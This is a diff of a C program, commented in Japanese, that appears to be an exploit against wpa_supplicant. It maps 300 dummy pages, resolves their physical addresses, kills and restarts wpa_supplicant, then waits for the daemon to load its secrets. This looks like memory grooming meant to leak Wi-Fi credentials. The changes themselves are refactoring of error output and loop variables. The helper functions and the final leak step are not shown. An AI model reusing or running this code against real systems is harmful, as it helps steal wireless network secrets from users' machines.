@@ -1,9 +1,8 @@
 #include "wpa.h"
-#include <stdio.h>
+#include "utils.h"
 #include <sched.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <stdlib.h>
 
 const int DUMMY_PAGE = 300;
 const int BUSY_LOOP = 5;
@@ -12,10 +11,12 @@ const int BUSY_LOOP = 5;
 const int OFFSET = 0x5000;
 
 int main() {
+    int i;
+
     // ダミーページ確保
     address dummy_pages[DUMMY_PAGE];
-    for (int i = 0; i < DUMMY_PAGE; i++) {
-        dummy_pages[i].virt_addr = custom_mmap();
+    for (i = 0; i < DUMMY_PAGE; i++) {
+        dummy_pages[i].virt_addr = mmap_custom();
         if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
         dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
     }
@@ -23,27 +24,25 @@ int main() {
     // wpa_supplicant が起動中なら一度止める
     if (get_process_id()) {
         if (kill_wpa_supplicant()) {
-            printf("[-] failed to kill wpa_supplicant\n");
-            exit(1);
+            err_exit("[-] failed to kill wpa_supplicant");
         }
     }
 
     // 他のプロセスに CPU を譲る
-    for (int _ = 0; _ < 10; _++) {
+    for (i = 0; i < 10; i++) {
         sched_yield();
     }
 
     // ダミーページ解放
-    for (int i = 0; i < DUMMY_PAGE; i++) {
+    for (i = 0; i < DUMMY_PAGE; i++) {
         munmap(dummy_pages[i].virt_addr, 0x1000);
     }
 
     // wpa_supplicant 起動
     if (start_wpa_supplicant()) {
-        printf("[-] failed to start wpa_supplicant\n");
-        exit(1);
+        err_exit("[-] failed to start wpa_supplicant");
     }
-    printf("[+] start wpa_supplicant\n");
+    puts("[+] start wpa_supplicant");
 
     // wpa_supplicant が秘密情報を配置するまで待機
     busy_loop(BUSY_LOOP);
